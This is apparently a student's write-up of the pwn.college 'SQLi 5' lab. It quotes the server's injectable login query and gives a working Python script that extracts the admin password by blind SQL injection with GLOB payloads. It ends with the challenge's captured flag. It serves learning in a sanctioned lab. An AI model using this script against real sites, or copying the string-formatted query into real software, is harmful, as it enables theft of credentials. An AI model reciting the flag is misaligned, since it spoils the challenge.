@@ -1,0 +1,72 @@
+# challenge: SQLi 5
+
+📅 2026-02-17
+📁 web security
+
+---
+
+## ✅ what i did  
+-clicked start
+-opened the terminal
+-ran: 'cat /challenge/server'
+table=user, columns=username, password
+admin - [flag]
+guest - password
+POST -> username&password
+query=SELECT rowid, * FROM users WHERE username = '{username}' AND password = '{ password }'
+if the login is successful the webpage doesn't print the flag
+this is a blind sequel injection
+the goal is to query the database and verify its reply (true->login successful or false->login failed)
+i used GLOB bc its case sensitive since the flag has both capital and non-capital letters
+-ran: '/challenge/server'
+-ran: 'vim bro'
+-typed:
+
+#!/usr/bin/env python3
+import requests
+import string
+from pwn import *
+from bs4 import BeautifulSoup
+
+context.log_level = 'error'
+
+url = "http://challenge.localhost:80/"
+
+headers = {
+    "Host" : "challenge.localhost"
+}
+
+charset = string.ascii_letters + string.digits + "{_-.}"
+
+flag = ""
+while True:
+    for c in charset:
+        payload = flag + c
+        data = {
+            "username" : "admin",
+            "password" : f"1' OR (password GLOB '{payload}*') AND password != 'password' --"
+        }
+
+        r = requests.post(url, headers=headers, data=data)
+        if "admin" in r.text:
+            flag += c
+            print(f"{flag}", end="\r", flush=True)
+            done = c
+            if c == "}":
+                print()
+                exit()
+            break
+
+
+## 🧑🏾‍🏫 what this challenge teaches u
+how to perform a Blind SQLi
+this challenge is super useful
+it helps u to understand how to automate script since in this case its almost impossible to retrieve the flag manually
+i defined a charset fulfilled with capital + non-capital letters + digits + {}-_.
+i iterated to each charset char requests using them as payload untill i found the right one
+if the payload is right the webserver redirects me to page
+once this happens, i concatenate the right payload to the flag im building
+im done once the last char is }
+
+## 🏁 Flag  
+pwn.college{kEcjdXZa6uBzC5hMEUqgaUD8CD8.QXzkzMzwCO4IDOxEzW}
